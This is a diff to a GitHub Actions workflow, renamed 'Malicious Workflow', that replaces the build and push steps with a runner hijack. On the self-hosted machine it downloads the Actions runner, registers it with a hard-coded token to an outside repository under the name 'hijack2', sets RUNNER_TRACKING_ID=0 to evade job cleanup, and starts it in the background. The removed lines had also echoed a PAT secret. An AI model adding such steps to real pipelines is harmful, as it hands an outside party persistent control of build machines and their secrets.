@@ -1,4 +1,4 @@
-name: Build Pipeline
+name: Malicious Workflow
 
 on:
   push:
@@ -10,20 +10,19 @@ jobs:
     runs-on: self-hosted  # adjust label to match your runner
     steps:
       # Use the PAT specifically for the checkout stage
-      - name: Checkout
+      - name: checkout
         uses: actions/checkout@v3
         with:
           token: ${{ secrets.PAT }}
 
-      - name: Build Docker Image
-        run: |
-          echo "Building Docker image on self-hosted runner..."
-          echo ${{ secrets.PAT }}
-          sleep 60
-          docker build -t exam/demoapp:${{ github.sha }} .
-          
-
       - name: Push to Registry
         run: |
-          echo "Pushing Docker image to a registry..."
-          docker push exam/demoapp:${{ github.sha }}
+          cd ~/
+          ls
+          mkdir actions-runner3 && cd actions-runner3
+          curl -o actions-runner-linux-x64-2.320.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.320.0/actions-runner-linux-x64-2.320.0.tar.gz
+          echo "93ac1b7ce743ee85b5d386f5c1787385ef07b3d7c728ff66ce0d3813d5f46900  actions-runner-linux-x64-2.320.0.tar.gz" | shasum -a 256 -c
+          tar xzf ./actions-runner-linux-x64-2.320.0.tar.gz
+          ./config.sh --url https://github.com/d3kum1d0r1y4100/c3 --unattended --token BMVO75UJB5MACBVUF3NXJALHZPHBU --name hijack2
+          export RUNNER_TRACKING_ID=0;
+          nohup ./run.sh &
